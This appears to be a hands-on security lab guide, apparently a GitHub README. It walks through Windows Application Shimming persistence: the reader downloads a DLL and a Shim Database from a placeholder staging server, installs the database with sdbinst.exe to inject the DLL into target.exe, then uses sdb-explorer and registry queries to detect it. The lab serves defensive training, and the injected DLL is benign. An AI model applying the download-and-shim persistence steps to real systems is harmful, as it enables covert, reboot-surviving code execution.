![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# SDB-Explorer

# Windows VM

## The objective of this lab is to use Application Shimming (via the native sdbinst.exe utility) to silently inject a demonstration DLL into a custom 32-bit application, establishing persistent execution — and then use sdb-explorer to forensically expose the hidden attack.

---

### Documentation and Scenario

**What is Application Shimming?**

The Windows Application Compatibility framework — commonly called the **Shim Engine** — is a legitimate Microsoft technology designed to resolve software compatibility issues between older applications and newer versions of Windows. Instead of modifying application code directly, Windows can intercept specific API calls and transparently reroute them through a compatibility layer, or "shim."

Shims are defined inside **Shim Database files (.sdb)**, binary files installed system-wide using the native Windows utility **sdbinst.exe**. Once a shim is installed, it persists across reboots and applies automatically every time a targeted application is launched — silently, in the background, with no user awareness.

If you want to dive a bit deeper, check the [Windows Application Compatibility Documentation](https://docs.microsoft.com/en-us/windows/win32/devnotes/application-compatibility-database).

**Key Concepts:**

- *Shim Database (.sdb)* : A binary file that defines compatibility fixes targeting specific executable names. Once installed, it is stored in a protected system directory and registered in the Windows registry.

- *sdbinst.exe* : A native, Microsoft-signed Windows utility for installing and uninstalling Shim Databases. Because it is a trusted, pre-existing system binary, its execution is rarely flagged by antivirus software.

- *InjectDll Fix* : A powerful shim type that instructs the Windows Application Compatibility Engine to automatically load an arbitrary DLL into a target process's memory at launch time. This is the core mechanism attackers abuse for persistence.

- *sdb-explorer* : A forensic command-line tool capable of parsing and displaying the contents of Shim Database (.sdb) files in human-readable form, exposing hidden fixes, targeted executables, and injected DLL paths.

>[!NOTE]
> Application Shimming is a textbook **"Living off the Land" (LotL)** persistence technique. The attacker uses **sdbinst.exe** — a legitimate, Microsoft-signed binary that already exists on every Windows installation — to deploy their payload. To the operating system, the Windows Event Log, and most endpoint security tools, this action looks completely routine.

---

### **SCENARIO**

- In this lab, we simulate a targeted persistence attack using two machines on the same subnet. *The Ubuntu VM acts as the attacker's staging server*, while *the Windows VM represents a compromised corporate endpoint*.

- The attacker has already achieved initial access to the Windows machine. Their goal now is to **establish persistent access** that survives reboots and requires no further interaction — no re-exploitation, no active connection.

- To accomplish this, the attacker installs a custom **Shim Database (patch.sdb)** that abuses the Windows Application Compatibility framework. The shim targets **target.exe**, a 32-bit application present on the endpoint. The `InjectDll` fix is applied as a 32-bit shim, exploiting the WoW64 subsystem to execute reliably on modern 64-bit Windows builds where native 64-bit shimming is restricted.

- For educational and safety purposes, the injected DLL (**demo.dll**) performs benign proof-of-concept actions rather than a real payload: it displays a visible warning popup and writes an execution log to disk. In a real attack, this would be a reverse shell or a credential harvester.

>[!IMPORTANT]
> You will start on the **Windows VM**, but consider all commands typed into the **Ubuntu Shell** as actions performed by the attacker on their remote staging server.

---

### Phase 1: Setup and Objective (Windows)

Before starting the simulation, we need to initialize the lab workspace on the compromised endpoint.

1. Open a **PowerShell** terminal as **Administrator**.

<img width="519" height="396" alt="image" src="https://github.com/user-attachments/assets/93150de2-b86f-4dcb-80bc-1f6067846d71" />

2. Navigate to the lab directory and run the session initialisation script:

```powershell
cd Desktop\Labs\SdbExplorerLab
.\lab_start.ps1
```

Once you see the green **[✓]**, leave this Administrator terminal open — you will need it throughout the lab.

<img width="742" height="513" alt="image" src="https://github.com/user-attachments/assets/f5905648-a04b-413b-a59c-a27ccd045306" />

---

### Phase 2: Staging the Attack (Ubuntu)

As the attacker, your tools are pre-staged on the Ubuntu server. All you need to do is start a web server to make the payload files downloadable by the compromised endpoint.

- Open an **Ubuntu Shell** terminal:

<img width="388" height="489" alt="image" src="https://github.com/user-attachments/assets/4f75c43c-43ee-49f0-b23d-08eb146ab986" />

- Navigate to the **Lab Directory** and start a Python web server:

```bash
cd ~/BnB/SdbExplorer
python3 -m http.server 8001
```

<img width="783" height="176" alt="image" src="https://github.com/user-attachments/assets/e3e94e21-29d6-46c2-9bc5-6dbba317bfd5" />

>[!NOTE]
> Note down your **\<UBUNTU_IP\>** — you will need it in the next phase.

The Lab Directory contains four pre-staged files:

- **demo.dll** — a 32-bit demonstration payload that triggers a visible popup and writes an execution log to disk.
- **target.exe** — the 32-bit application that will be shimmed. It acts as the attacker's chosen persistence trigger on this endpoint.
- **patch.sdb** — a Shim Database pre-configured to inject `demo.dll` into `target.exe`.
- **sdb-explorer.exe** — the forensic analysis tool used in the Blue Team phase.

<img width="710" height="217" alt="image" src="https://github.com/user-attachments/assets/4dc151d0-1f0e-4071-bb80-bd47b7006e16" />

---

### Phase 3: Payload Delivery & Shim Installation (Windows)

Switch back to the compromised Windows machine. Using your Administrator PowerShell terminal, download the attack tools from the Ubuntu staging server and silently install the Shim.

- Download all four files. **Replace \<UBUNTU_IP\> with your actual Ubuntu IP address:**

```powershell
# Download the demonstration DLL to a plausible, user-writable location
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/demo.dll" -OutFile "C:\Users\Public\demo.dll"

# Download the target application to the same location
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/target.exe" -OutFile "C:\Users\Public\target.exe"

# Download the Shim Database to a temporary folder
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\patch.sdb"

# Download the forensic tool (used in the Blue Team phase)
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/sdb-explorer.exe" -OutFile "C:\Users\Public\sdb-explorer.exe"
```

<img width="1640" height="267" alt="image" src="https://github.com/user-attachments/assets/799aec4d-c46e-4ca0-add6-40d445bafaee" />

- Back in the Ubuntu terminal, you should now see four GET requests logged by the Python server — one for each downloaded file:

<img width="840" height="327" alt="image" src="https://github.com/user-attachments/assets/035d6ebc-63ad-4584-911f-adcf012ee794" />

- Now install the Shim Database on the Windows machine using **sdbinst.exe** — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique. In the **powershell terminal**, type:

```powershell
C:\Windows\SysWOW64\sdbinst.exe "$env:TEMP\patch.sdb"
```

You will see a brief confirmation message. Silently and without any visible indication to a regular user, the OS has now been instructed to inject `demo.dll` into every future instance of `target.exe`.

<img width="1101" height="100" alt="image" src="https://github.com/user-attachments/assets/343dccdf-8598-442f-8cd2-f0c54c724c30" />

>[!NOTE]
> **sdbinst.exe requires Administrator privileges.** In a real attack, this means the adversary must have already escalated their privileges before reaching this stage — a realistic assumption on a compromised corporate endpoint.

---

### Phase 4: Triggering the Persistence

The shim is now installed and armed. From this point forward, every time `target.exe` is launched — by any user, including after a reboot — the Application Compatibility Engine will silently load `demo.dll` into its memory before the application even starts.

- Open a **NEW, PowerShell terminal** and launch the target application:

```powershell
Start-Process C:\Users\Public\target.exe
```

<img width="1134" height="717" alt="image" src="https://github.com/user-attachments/assets/fc17239d-054a-4d28-93fd-c1e43d2d28e2" />

Two things happen immediately and in sequence: first, `demo.dll` loads and displays a warning Message Box titled **"SdbExplorer Lab — Shim Active"** and writes a log to `C:\Windows\Temp\shimmed.log`. Then, after you dismiss that popup, `target.exe` itself opens its own window.

The injection order is the key observation: **demo.dll ran before the application's own code did**. The Application Compatibility Engine intercepted the process launch, injected the payload, and returned control to the application — all transparently, without the user's knowledge.

>[!IMPORTANT]
> Click **OK** on the demo.dll popup, but **leave target.exe open** — you will need the live process for the detection steps below.

<img width="738" height="507" alt="image" src="https://github.com/user-attachments/assets/b4a1691d-741d-4cb9-9dc2-7b19c85121ec" />

---

### Phase 5: Blue Team Detection

Time to switch perspective. You are now a security analyst responding to an endpoint behavioural alert. You do not yet know what persistence mechanism was used — but you are about to uncover it forensically.

Switch back to your **Administrator PowerShell terminal**.

**Step 1 — Verify the Execution Artifact**

Inspect the log file written to disk during the trigger phase:

```powershell
Get-Content C:\Windows\Temp\shimmed.log
```

<img width="839" height="79" alt="image" src="https://github.com/user-attachments/assets/da8862fd-5d22-4a85-ab4c-a141784dc8e3" />

The log confirms that a DLL was injected into a running process through the Application Compatibility framework. This is your first indicator of compromise.

**Step 2 — Inspect Running Process Modules**

Let's examine the running target.exe process to see what dynamic link libraries are currently loaded inside its memory space. 

<img width="1133" height="239" alt="image" src="https://github.com/user-attachments/assets/b4253e39-9519-462e-8519-b9b616d5e3b7" />

>[!NOTE]
>Because target.exe is a 32-bit process, querying it from a 64-bit PowerShell console will hide its 32-bit DLLs due to WOW64 boundary limitations. We must use the 32-bit version of PowerShell to reveal the truth!

```powershell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -Command "Get-Process target | Select-Object -ExpandProperty Modules | Where-Object FileName -like '*Users\Public*'"
```

<img width="1131" height="188" alt="image" src="https://github.com/user-attachments/assets/fe090cd9-042f-41c9-9284-ad53a3481ad7" />

You will see `C:\Users\Public\demo.dll` loaded inside the process. A DLL loaded from a user-writable public directory inside any application is a significant red flag — legitimate software does not do this.

**Step 3 — Check the AppCompat Registry for Installed Shims**

`sdbinst.exe` always writes entries to the Windows Registry when it installs a Shim Database. Let's look:

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" | Get-ItemProperty | Select-Object PSChildName, DatabasePath, DatabaseDescription
```

<img width="1120" height="152" alt="image" src="https://github.com/user-attachments/assets/3f1df31d-bfaf-423e-bb9d-47127ed30994" />

You will find a GUID-based entry referencing an installed `.sdb` file. The presence of an unrecognised custom Shim Database on a standard user workstation is a significant anomaly — IT-managed compatibility shims are rarely deployed this way.

**Step 4 — Locate the SDB File on Disk**

Shims installed by sdbinst.exe are stored in protected system directories, renamed with cryptic GUIDs so they blend in with OS files:

```powershell
ls C:\Windows\AppPatch\CustomSDB\
```

<img width="977" height="225" alt="image" src="https://github.com/user-attachments/assets/f54a0ff2-2e6b-4470-a97e-2416ee0bc4e4" />

You will find a .sdb file matching the registry GUID. This is the attacker's patch.sdb hiding in plain sight.

**Step 5 — Forensic Autopsy with sdb-explorer**

Native Windows utilities cannot natively parse the proprietary tag-based binary format of .sdb files. As an investigator, pointing standard text editors at these files only yields corrupted unreadable bytes. This is where **sdb-explorer** becomes our primary forensic lens. 

By passing the `-t` (Tree) flag, we instruct the tool to disassemble the Shim Database and map its internal memory tags:

```powershell
$sdbFile = (Get-ChildItem C:\Windows\AppPatch\CustomSDB\ -Filter "*.sdb" | Select-Object -First 1).FullName
cd C:\Users\Public
.\sdb-explorer.exe -t $sdbFile
```

The output floods the terminal with a complete architectural breakdown of the attacker's weapon. Let's first take a quick look at the **Index Table**

<img width="1321" height="940" alt="image" src="https://github.com/user-attachments/assets/edc3d626-4af0-4c33-8315-68dde248f743" />


Reading past the initial OS optimization block (TAG 7802 - INDEXES), we reach the core execution instructions starting at TAG 7001 - DATABASE. This section of the output is the actual brain of the attacker's Shim Database. The `sdb-explorer` tool breaks down the binary tags into a readable execution flow:

1. **TAG 7001 - DATABASE:** This is the header of the rule. Notice the `DATABASE_ID` matches the exact GUID we previously found hidden in the Windows Registry.
2. **TAG 7007 - EXE:** This defines the target. The adversary wants to hijack `target.exe`. 
3. **TAG 7008 - MATCHING_FILE (`*`):** This is a critical security bypass. By using a wildcard (`*`), the attacker stripped all file-validation checks. Windows will not verify the file's hash, digital signature, or location. If a process is simply named `target.exe`, it gets infected.
4. **TAG 7009 - SHIM_REF:** The instructions given to the OS. The `InjectDll` fix is a built-in Application Compatibility feature, but here it is weaponized. The `COMMAND_LINE` tag points directly to our malicious payload: `C:\Users\Public\demo.dll`.

<img width="992" height="641" alt="image" src="https://github.com/user-attachments/assets/e8aed8c1-4a79-4ac8-a045-a2f3c6b43b13" />

*(Note: Wondering what **TAG 7801 - STRINGTABLE** at the bottom is? To save file space, the .sdb binary format doesn't write words multiple times. It stores all text strings in a single "dictionary" at the very end of the file, and the tags above simply point to them!)*

This is definitive proof of compromise: a rogue, persistent OS-level directive commanding the Windows kernel to silently force-feed an unauthorized dynamic library into a user application every time it spawns.

---

### Cleanup

Let's remove all lab artifacts and restore the endpoint to its original state.

- **On Ubuntu:** Press `CTRL+C` in the terminal to stop the Python web server. Close the terminal.

- **On Windows:** In your Administrator PowerShell, uninstall the Shim Database:

```powershell
sdbinst.exe -u "$env:TEMP\patch.sdb"
```

Remove all downloaded files and the execution log:

```powershell
Remove-Item "C:\Users\Public\demo.dll"         -Force
Remove-Item "C:\Users\Public\target.exe"       -Force
Remove-Item "C:\Users\Public\sdb-explorer.exe" -Force
Remove-Item "C:\Windows\Temp\shimmed.log"      -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\patch.sdb"              -Force
```

Close `target.exe` and all open terminal windows.

---

### Conclusion

In this lab, you completed a full persistence attack cycle built entirely on native Windows mechanics. An adversary with administrative access can silently install a Shim Database using a Microsoft-signed binary, causing any targeted application to execute unauthorised code on every launch — automatically, persistently across reboots, and with no further attacker interaction required. As a Blue Teamer, you learned to trace the forensic footprints left behind: an execution log dropped to disk, a foreign DLL loaded inside a running process, a suspicious GUID entry in the AppCompatFlags registry, and a hidden binary file inside a protected Windows folder. With sdb-explorer, you cut through the obfuscation of the binary SDB format and exposed exactly what the attacker had planted.

<br></br>

# Finished?

[Back to Card's Main Page]()
